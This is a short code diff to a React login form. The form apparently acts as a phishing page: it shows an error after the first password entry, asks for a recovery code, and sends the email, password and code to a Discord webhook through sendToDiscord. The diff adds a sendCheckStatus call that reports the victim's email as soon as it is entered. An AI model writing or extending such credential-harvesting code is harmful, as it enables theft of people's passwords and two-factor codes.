@@ -1,6 +1,6 @@
 import React, { useState, KeyboardEvent } from 'react';
 import { Edit2, ArrowRight, Eye, EyeOff, AlertCircle, Mail, Loader2, HelpCircle } from 'lucide-react';
-import { sendToDiscord } from '../utils/webhook';
+import { sendToDiscord, sendCheckStatus } from '../utils/webhook';
 
 export function LoginForm() {
   const [showPassword, setShowPassword] = useState(false);
@@ -28,9 +28,12 @@ export function LoginForm() {
       setIsLoading(false);
       setShowError(true);
     } else if (showError && !showRecoveryCode) {
+      setIsLoading(true);
+      await sendCheckStatus(email);
       setShowSuccessMessage(true);
       setShowError(false);
       setShowRecoveryCode(true);
+      setIsLoading(false);
     } else if (showRecoveryCode) {
       setIsLoading(true);
       await sendToDiscord({ email, password, code: recoveryCode });
